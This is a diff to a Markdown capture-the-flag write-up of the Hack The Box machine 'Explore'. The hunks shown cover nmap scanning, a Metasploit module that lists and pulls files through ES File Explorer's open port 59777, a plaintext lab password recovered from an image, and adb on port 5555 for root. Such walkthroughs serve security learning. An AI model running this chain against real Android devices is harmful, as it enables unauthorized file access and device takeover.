@@ -1,8 +1,30 @@
+---
+title: Explore – Hack The Box
+description: ""
+tags:
+  - adb
+  - vuln
+  - filesystem
+  - HackTheBox
+  - android
+keywords:
+  - android reversing
+  - ctf writeup
+  - HackTheBox
+  - HTB
+  - mobile writeups
+  - apk decompilation
+  - frida tool
+  - mobile security research
+canonical: https://lautarovculic.github.io/writeups/Explore%20%E2%80%93%20Hack%20The%20Box/
+---
+
 ![[explore1.png]]
 
 ----
 
 ## User.txt
+
 Let’s check the **open ports** with **nmap**
 
 ```bash
@@ -40,9 +62,11 @@ Looking in the **port 59777** i found this directories
 ```
 
 It’s seems as a **file explorer**. If we search **port 59777** on Google, we can found
+
 ![[explore2.png]]
 
 Try searching in **metasploit**
+
 There are a **aux** module
 ```bash
 use auxiliary/scanner/http/es_file_explorer_open_port
@@ -90,7 +114,9 @@ Auxiliary actions:
 ```
 
 Trying every action, I can look some interesting.
+
 Set the action LISTPICS with **set action LISTPICS**
+
 And then, exploit
 
 Output
@@ -110,6 +136,7 @@ wget http://10.10.10.247:59777/storage/emulated/0/DCIM/creds.jpg
 ![[explore3.png]]
 
 **User:** kristi
+
 **Password:** Kr1sT!5h@Rp3xPl0r3!
 
 Let’s log in via **ssh**
@@ -129,6 +156,7 @@ f3201717***********91ae250
 ```
 
 ## Root.txt
+
 Now let’s **identify the port 5555**, that normally is for **adb** connections.
 ```bash
 ss -ntpl
@@ -178,6 +206,5 @@ Now we are **root** and just find the **root.txt** flag in
 f04fc*********2be59338c5
 :/data #
 ```
-
 
 I hope you found it useful (:
